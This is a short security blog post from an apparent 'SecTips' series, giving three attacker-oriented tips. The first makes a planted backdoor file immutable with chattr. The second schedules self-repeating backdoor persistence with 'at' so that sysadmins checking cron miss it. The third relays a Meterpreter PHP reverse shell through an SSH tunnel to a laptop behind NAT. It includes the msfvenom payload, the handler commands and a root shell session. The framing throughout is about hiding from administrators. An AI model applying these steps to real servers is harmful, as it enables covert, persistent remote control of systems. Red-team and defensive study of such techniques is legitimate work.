---
title: "SecTips #Jan20"
author: "Adam Jordan"
description: "Happy new year 2020! In this month's SecTips, I will give some tips about
how to create an unremovable file in UNIX,
how to use AT for backdoor persistence,
and how to listen to meterpreter with a laptop behind NAT."
tags: [security, sectips]
date: 2020-01-24
draft: false
---

> **About SecTips**

> This is a series in which I will write some tips related to security engineering.
> Instead of discussing heavy and long topics, I will present some _fun_ things in a concise walkthrough format.


Happy new year 2020! In this month's SecTips, I will give some tips about
how to create an unremovable file in UNIX,
how to use AT for backdoor persistence,
and how to listen to meterpreter with a laptop behind NAT.

1. [Unremovable Files in UNIX](#tips1)
2. [Your Sysadmin knows CRON? Try using AT](#tips2)
3. [Listen to Meterpreter with your Laptop behind NAT](#tips3)



## TIPS-01: Unremovable Files in UNIX<a name="tips1"></a>

Let's say you have put your super malicious backdoor in a server, and you did not want anyone to remove this backdoor file. How to do this? Just make it immutable in file-system level _:v_

```bash
$ touch u-cant-rm-this

$ ls -l
total 0
-rw-r--r-- 1 root root 0 Mar 14 09:39 u-cant-rm-this

$ chattr +i u-cant-rm-this

$ ls -l
total 0
-rw-r--r-- 1 root root 0 Mar 14 09:39 u-cant-rm-this

$ rm u-cant-rm-this
rm: cannot remove 'u-cant-rm-this': Operation not permitted
```

---

## TIPS-02: Your Sysadmin knows CRON? Try using AT<a name="tips2"></a>

You want to make your backdoor persistence? One of the easiest thing is to just add it to cron.
However, let's face the truth: EVERYBODY knows cron!
Of course it will be the first place to check by your sysadmin, and your malicious backdoor will be gone as easily as you put it on the cron.

Try using `at`. Of course if someone knows it, it is also very easy to detect and remove,
but I'll bet there are far fewer people that knows that the command even exists.

```bash
$ echo "echo 1337 > /tmp/meh" > malicious.sh

$ at -f malicious.sh now + 1 minute
warning: commands will be executed using /bin/sh
Job 1 at Thu Mar 14 18:54:00 2019

$ atq
1 Thu Mar 14 18:54:00 2019 a user

# wait...

$ cat /tmp/meh
1337
```


But it only run once! What to do if you want to run this periodically?

Just add `at` command in your scripts...

```bash
$ echo "at -f malicious.sh now + 1 minute" >> malicious.sh
$ at -f malicious.sh now + 1 minute
```

---

## TIPS-03: Listen to Meterpreter with your Laptop behind NAT<a name="tips3"></a>

When you are targeting a server on the internet, sometimes you'd like to listen to an incoming reverse shell session (via Meterpreter).
In this case, you will need to setup the listener on a server with a public IP address.

However, let's imagine a situation where we don't want to run metasploit on our servers, maybe to keep the server clean.
What we want is to run the metasploit on our laptop, but _alas_, it did not have any front-facing public IP.

In this tips, I will show how to use our server as proxy to forward the reverse shell session from our target to our laptop sitting behind NAT.


```bash
# setup ssh tunnel
laptop:$ ssh -R 0.0.0.0:8080:127.0.0.1:1337 -NF user@proxy_server

# listen for meterpreter connection
laptop:$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set LHOST 127.0.0.1
msf5 exploit(multi/handler) > set LPORT 1337
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > exploit -j
```

Next let's generate payload and have our target execute it.

```bash
# generate payload
laptop:$ msfvenom -p php/meterpreter_reverse_tcp \
     LHOST=proxy_server \
     LPORT=8080 > payload

# move payload to target server
laptop:$ scp payload.php target:payload.php

# execute payload in target server
target:$ php payload.php
```

Then _boom_, the meterpreter is connected to your laptop.

```bash
msf5 exploit(multi/handler) >
[*] Meterpreter session 1 opened

msf5 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter php/linux  root (0) @ f62342bbe4ce  127.0.0.1:1337 -> 127.0.0.1:51306 (127.0.0.1)

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 121 created.

whoami
root
```
